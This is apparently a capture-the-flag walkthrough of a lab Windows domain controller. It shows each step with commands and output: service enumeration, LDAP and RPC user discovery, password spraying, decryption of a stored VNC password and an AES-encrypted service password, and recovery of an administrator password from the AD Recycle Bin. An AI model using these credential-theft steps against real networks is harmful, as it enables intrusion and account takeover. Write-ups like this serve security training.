
Difficulty: Medium

### Information Gathering

IP Address: 10.129.38.120

#### Service Enumeration

Enumeration of the services with NMAP.

```
sudo nmap 10.129.38.120
```

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
```

With more details.
```
sudo nmap 10.129.38.120 -sC -sV
```

```
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-24 01:50:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

#### Initial Access - Password visible through LDAP

RPC Enumeration of users is working.
```
rpcclient cascade.local -U '%'
```

```
rpcclient $> enumdomusers
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
```

Now, a user list is made through this command.
```
cat test.txt | cut -d] -f1 | cut -d'[' -f2 > users.txt
```

While user enumeration does not work through SMB nor Kerberos, LDAP Search manages to find an output of logs.
```
ldapsearch -x -H ldap://10.129.38.120 -b "DC=cascade,DC=local" | grep -i pwd
```

We manage to find something interesting through the LDAP logs.
```
cascadeLegacyPwd: clk0bjVldmE=
```

This can be base64-decoded.
```
echo 'clk0bjVldmE=' | base64 -d
```

The password is `rY4n5eva`

All the found accounts will be tested through this password.
```
netexec smb cascade.local -u users.txt -p rY4n5eva --continue-on-success
```

The valid set of credentials is `r.thompson:rY4n5eva`

#### Initial Access - Password Decryptable from a Share

Those are the available shares from this user.
```
<SNIP>
SMB         10.129.38.120   445    CASC-DC1         Share           Permissions     Remark
SMB         10.129.38.120   445    CASC-DC1         -----           -----------     ------
SMB         10.129.38.120   445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.129.38.120   445    CASC-DC1         Audit$
SMB         10.129.38.120   445    CASC-DC1         C$                              Default share
SMB         10.129.38.120   445    CASC-DC1         Data            READ
SMB         10.129.38.120   445    CASC-DC1         IPC$                            Remote IPC
SMB         10.129.38.120   445    CASC-DC1         NETLOGON        READ            Logon server share
SMB         10.129.38.120   445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.129.38.120   445    CASC-DC1         SYSVOL          READ            Logon server share
```

In the file `VNC Install.reg`, it is possible to find an encoded password.
```
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

Exploit: https://github.com/billchaison/VNCDecrypt

According to a GitHub Exploit, this is the command to decrypt the password.
```
echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
```

The credentials are now tested.
```
netexec winrm cascade.local -u s.smith -p sT333ve2
```

The new credentials are `s.smith:sT333ve2`.
The WinRM session is initiated.
```
evil-winrm -i cascade.local -u s.smith -p sT333ve2
```

The user flag has been obtained.
![](<Screenshot 2026-07-24 at 11.52.46.png>)

# Root Flag
#### Privilege Escalation - Plaintext decryption keys in EXE file

There is another share available from the user which is `Audit$`
```
smbclient //cascade.local/Audit$ -U 's.smith%sT333ve2'
```

The contents of the files are now being listed.
```
smb: \> dir
  .                                   D        0  Wed Jan 29 13:01:26 2020
  ..                                  D        0  Wed Jan 29 13:01:26 2020
  CascAudit.exe                      An    13312  Tue Jan 28 16:46:51 2020
  CascCrypto.dll                     An    12288  Wed Jan 29 13:00:20 2020
  DB                                  D        0  Tue Jan 28 16:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 18:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 02:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 02:38:38 2019
  x64                                 D        0  Sun Jan 26 17:25:27 2020
  x86                                 D        0  Sun Jan 26 17:25:27 2020
```

The database file looks promising.
That file is now downloaded on the attacker system.
```
get Audit.db
```

The file can be read through this command.
```
sqlite3 Audit.db
```

After interacting with the file, there is a base64-encoded string that is visible.
```
.tables
DeletedUserAudit  Ldap              Misc
sqlite> select * from DeletedUserAudit
   ...> ;
6|test|Test
DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
7|deleted|deleted guy
DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local
9|TempAdmin|TempAdmin
DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local
sqlite> select * from ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
sqlite> select * from Misc;
```

While that string is base64 decoded, it remains encrypted.

After examining `CascAudit.exe` through a Disassembler, JetBrains Rider, key parameters such as the decryption key and the IV were both found.

As for now, those are the available values.

Encrypted String: `BQO5l5Kj9MdErXx6Q6AGOw==`
Key: `c4scadek3y654321`
IV: `1tdyjCbY1Ix49842`

It is possible to assume that this is a simple AES-128 encryption/decryption by inspecting the source code.

After using a simple decryptor online, the resulting password is `w3lc0meFr31nd`

The credentials worked successfully.
```
netexec winrm cascade.local -u arksvc -p w3lc0meFr31nd
```

Now it is possible to login to this user through WinRM.
```
evil-winrm -i cascade.local -u arksvc -p w3lc0meFr31nd
```

# Root Flag
#### Privilege Escalation - AD Recycle Bin Password File Access

The privileges and groups of this user are now being checked.
```
whoami /priv
whoami /groups
```

It is possible to see that this user is part of the `AD Recycle Bin` group, which can interact with the Recycle Bin.
```
Get-ADObject -ldapfilter "(&(objectclass=user)(isDeleted=TRUE))" -IncludeDeletedObjects
```

```
Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName=TempAdmin)(isDeleted=TRUE))" -IncludeDeletedObjects -Properties *
```

After inspecting, there is a password like base64-encoded string just like what was inside the LDAP logs.
```
cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz
```

After decoding the string, this is the valid password string.
```
echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d
baCT3r1aN00dles
```

While the original username was `TempAdmin`, login is attempted from the `Administrator` account directly.
```
netexec winrm cascade.local -u Administrator -p baCT3r1aN00dles
```

The credentials are valid, login is now possible.
```
evil-winrm -i cascade.local -u Administrator -p 'baCT3r1aN00dles'
```

The root flag has been successfully obtained.

![](<Screenshot 2026-07-24 at 18.07.12.png>)